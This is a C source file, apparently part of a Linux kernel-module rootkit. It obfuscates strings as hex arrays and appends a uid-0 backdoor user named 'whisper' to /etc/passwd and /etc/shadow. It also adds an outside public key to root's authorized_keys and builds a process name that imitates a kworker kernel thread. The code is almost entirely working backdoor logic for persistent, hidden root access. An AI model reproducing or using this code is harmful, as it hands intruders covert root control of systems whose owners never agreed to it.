#include <linux/fcntl.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/spinlock_types.h>
#include <linux/syscalls.h>

#include "sensitive.h"

DEFINE_SPINLOCK(lock);

int add_file_line(const char *filename, const char *line) {
  int ret;
  mm_segment_t curfs;
  unsigned long long pos = 0;
  struct file *f = filp_open(filename, O_APPEND|O_CREAT|O_WRONLY, 0);
  curfs = get_fs();
  set_fs(KERNEL_DS);
  if (IS_ERR(f)) {
    printk(KERN_INFO "ERR");
    return -1;
  }
  ret = vfs_write(f, line, strlen(line), &pos);
  filp_close(f, NULL);
  set_fs(curfs);
  return ret;
}

int add_user_passwd(void) {
  // /etc/passwd
  char filename[] = {0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64,0x00};
  // whisper:x:0:0::/:/bin/sh\n
  char entry[] = {0x77,0x68,0x69,0x73,0x70,0x65,0x72,0x3a,0x78,0x3a,0x30,0x3a,0x30,0x3a,0x3a,0x2f,0x3a,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0xa,0x00};
  printk(KERN_INFO "Adding passwd");

  return add_file_line(filename, entry);
}

int add_user_shadow(void) {
  // /etc/shadow
  char filename[] = {0x2f,0x65,0x74,0x63,0x2f,0x73,0x68,0x61,0x64,0x6f,0x77,0x00};
  // whisper:$6$Aup3Tx4Z$./vVsYUzZ95Q.4OK1GfQighXG4sSQXc0BSVnl2yKyhfdlmGDesbCp.0k8vh9SNtshLOXMeqx.XRtLvo1rrviF/::0:99999:7:::\n
  char entry[] = {0x77,0x68,0x69,0x73,0x70,0x65,0x72,0x3a,0x24,0x36,0x24,0x41,0x75,0x70,0x33,0x54,0x78,0x34,0x5a,0x24,0x2e,0x2f,0x76,0x56,0x73,0x59,0x55,0x7a,0x5a,0x39,0x35,0x51,0x2e,0x34,0x4f,0x4b,0x31,0x47,0x66,0x51,0x69,0x67,0x68,0x58,0x47,0x34,0x73,0x53,0x51,0x58,0x63,0x30,0x42,0x53,0x56,0x6e,0x6c,0x32,0x79,0x4b,0x79,0x68,0x66,0x64,0x6c,0x6d,0x47,0x44,0x65,0x73,0x62,0x43,0x70,0x2e,0x30,0x6b,0x38,0x76,0x68,0x39,0x53,0x4e,0x74,0x73,0x68,0x4c,0x4f,0x58,0x4d,0x65,0x71,0x78,0x2e,0x58,0x52,0x74,0x4c,0x76,0x6f,0x31,0x72,0x72,0x76,0x69,0x46,0x2f,0x3a,0x3a,0x30,0x3a,0x39,0x39,0x39,0x39,0x39,0x3a,0x37,0x3a,0x3a,0x3a,0xa,0x00};
  printk(KERN_INFO "Adding shadow");

  return add_file_line(filename, entry);
}

int add_root_pubkey(void) {
  // /root/.ssh/authorized_keys
  char filename[] = {0x2f,0x72,0x6f,0x6f,0x74,0x2f,0x2e,0x73,0x73,0x68,0x2f,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64,0x5f,0x6b,0x65,0x79,0x73,0x00};
  // ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBImLBYt8Q7MH3lpYRv0Flq5V8ftrBFUNumq01iOgeVrcUsEG+c3mmMG24N5LbbL+JkPIzm2k3/J7lxOmUfooTiE=\n
  char entry[] = {0x65,0x63,0x64,0x73,0x61,0x2d,0x73,0x68,0x61,0x32,0x2d,0x6e,0x69,0x73,0x74,0x70,0x32,0x35,0x36,0x20,0x41,0x41,0x41,0x41,0x45,0x32,0x56,0x6a,0x5a,0x48,0x4e,0x68,0x4c,0x58,0x4e,0x6f,0x59,0x54,0x49,0x74,0x62,0x6d,0x6c,0x7a,0x64,0x48,0x41,0x79,0x4e,0x54,0x59,0x41,0x41,0x41,0x41,0x49,0x62,0x6d,0x6c,0x7a,0x64,0x48,0x41,0x79,0x4e,0x54,0x59,0x41,0x41,0x41,0x42,0x42,0x42,0x49,0x6d,0x4c,0x42,0x59,0x74,0x38,0x51,0x37,0x4d,0x48,0x33,0x6c,0x70,0x59,0x52,0x76,0x30,0x46,0x6c,0x71,0x35,0x56,0x38,0x66,0x74,0x72,0x42,0x46,0x55,0x4e,0x75,0x6d,0x71,0x30,0x31,0x69,0x4f,0x67,0x65,0x56,0x72,0x63,0x55,0x73,0x45,0x47,0x2b,0x63,0x33,0x6d,0x6d,0x4d,0x47,0x32,0x34,0x4e,0x35,0x4c,0x62,0x62,0x4c,0x2b,0x4a,0x6b,0x50,0x49,0x7a,0x6d,0x32,0x6b,0x33,0x2f,0x4a,0x37,0x6c,0x78,0x4f,0x6d,0x55,0x66,0x6f,0x6f,0x54,0x69,0x45,0x3d,0xa,0x00};
  printk(KERN_INFO "Adding pubkey");

  return add_file_line(filename, entry);
}

// Fill in proc name using stack instead of data so it can be encrypted.
char *proc_name(void) {
  char proc[] = {0x6b,0x77,0x6f,0x72,0x6b,0x65,0x72,0x2f,0x30,0x3a,0x31,0x3a,0x30,0x00};

  return proc;
}
